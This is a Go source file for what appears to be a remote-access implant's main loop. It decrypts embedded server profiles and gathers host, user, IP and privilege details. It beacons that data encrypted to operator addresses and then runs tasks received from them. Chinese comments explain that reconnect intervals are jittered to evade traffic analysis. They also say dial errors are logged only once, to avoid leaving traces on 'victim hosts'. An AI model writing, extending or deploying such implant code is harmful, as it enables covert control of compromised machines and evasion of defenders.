package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"gopher/functions"
	"gopher/utils"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true

var WakeupChan = make(chan struct{}, 1)

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)
	transportSalt := make([]byte, 16)
	_, _ = rand.Read(transportSalt)

	info := utils.SessionInfo{
		Process:       path,
		PID:           os.Getpid(),
		User:          username,
		Host:          host,
		Ipaddr:        ip,
		Elevated:      functions.IsElevated(),
		Acp:           acp,
		Oem:           oemcp,
		Os:            runtime.GOOS,
		OSVersion:     osVersion,
		EncryptKey:    randKey,
		TransportSalt: transportSalt,
	}

	data, _ := msgpack.Marshal(info)

	fullKey := append(append([]byte(nil), randKey...), transportSalt...)
	return data, fullKey
}

var profiles []utils.Profile
var encKeys [][]byte
var profileIndex int
var profile utils.Profile
var AgentId uint32
var encKey []byte

func main() {

	for _, encProfile := range encProfiles {
		key := make([]byte, 16)
		copy(key, encProfile[:16])
		encData := encProfile[16:]
		decData, err := utils.DecryptData(encData, key)
		if err != nil {
			continue
		}

		var p utils.Profile
		err = msgpack.Unmarshal(decData, &p)
		if err != nil {
			continue
		}

		profiles = append(profiles, p)
		encKeys = append(encKeys, key)
	}

	if len(profiles) == 0 {
		return
	}

	profileIndex = 0
	profile = profiles[profileIndex]
	encKey = encKeys[profileIndex]

	sessionInfo, sessionKey := CreateInfo()
	utils.SKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
	initMsg, _ = utils.EncryptData(initMsg, encKey)

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	addrIndex := 0
	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(axReconnectDelay(profile.ConnTimeout))
			addrIndex++
			if addrIndex >= len(profile.Addresses) {
				addrIndex = 0
				profileIndex = (profileIndex + 1) % len(profiles)
				profile = profiles[profileIndex]
				encKey = encKeys[profileIndex]
				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
				initMsg, _ = utils.EncryptData(initMsg, encKey)
			}
		}

		///// Connect

		var (
			err  error
			conn net.Conn
		)

		conn, err = DialProfile(profile, profile.Addresses[addrIndex])
		if err != nil {
			axReportDialErr(err)
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				continue
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, initMsg)

		/// Recv Command

		var (
			inMessage  utils.Message
			outMessage utils.Message
			recvData   []byte
			sendData   []byte
		)

		for ACTIVE {
			recvData, err = functions.RecvMsg(conn)
			if err != nil {
				break
			}

			outMessage = utils.Message{Type: 0}
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ = msgpack.Marshal(outMessage)
			sendData, _ = utils.EncryptData(sendData, sessionKey)
			_ = functions.SendMsg(conn, sendData)
		}
	}
}

func SignalWakeup() {
	select {
	case WakeupChan <- struct{}{}:
	default:
	}
}
// axReconnectDelay 给**固定**的重连间隔加 ±1/3 的对称抖动（M8①）。
//
// ★ 为什么必须抖：
//  1. 定长间隔是流量分析里最好摘的特征之一；更实际的是 **N 个 agent 会永远同步** ——
//     同一次行动投出去的 agent 带着同一个 conn_timeout，重连永远同刻发生，在服务端
//     日志上就是一条整齐的脉冲。
//  2. 对称抖动**不改变平均间隔**，操作手感与改造前一致。
//
// ★ base<=0（profile 未配）时返回 0：与改造前 `0 * time.Second` 逐字等价。
// ★ 用 crypto/rand 而非 math/rand：main.go 已经引了 crypto/rand，不新增依赖；
//   每个重连周期只取 2 字节，代价可忽略。
func axReconnectDelay(base int) time.Duration {
	if base <= 0 {
		return 0
	}
	amp := base / 3
	if amp < 1 {
		amp = 1
	}
	if amp > 300 {
		amp = 300 // 上界：避免 base 极大时 2*amp+1 溢出 uint16
	}
	var b [2]byte
	_, _ = rand.Read(b[:])
	off := int(binary.BigEndian.Uint16(b[:])%uint16(2*amp+1)) - amp
	d := base + off
	if d < 1 {
		d = 1
	}
	return time.Duration(d) * time.Second
}

// axReportDialErr 把**首次**回连失败写到 stderr，此后静默（M9/S5 + B-B1）。
//
// ★ 修的是什么：`transport_nolibp2p.go` 的替身在"profile 说 libp2p、产物却没带
//   -tags libp2p"时返回
//       this build has no libp2p support (rebuild the agent with -tags libp2p)
//   而调用点只是 `continue` ⇒ agent **永远静默重试**。operator 看到的只有"不上线"，
//   与"目标不可达""密钥不对"完全无法区分。rportfwd 那次"静默假成功"是同一族。
// ★ 为什么代价可接受：正常部署里这条分支**永不触发**（拨号会成功），对隐匿性的
//   代价是零；一旦触发，它是唯一能把"配置错"和"网络不通"分开的证据。
// ★ 只报一次：不给受害主机的日志留周期性的心跳式痕迹。
// ★ 不需要 mutex：唯一调用点是 main() 里那个单协程重连循环。
var axDialErrReported bool

func axReportDialErr(err error) {
	if axDialErrReported {
		return
	}
	axDialErrReported = true
	_, _ = fmt.Fprintln(os.Stderr, "gopher: dial failed: "+err.Error())
}
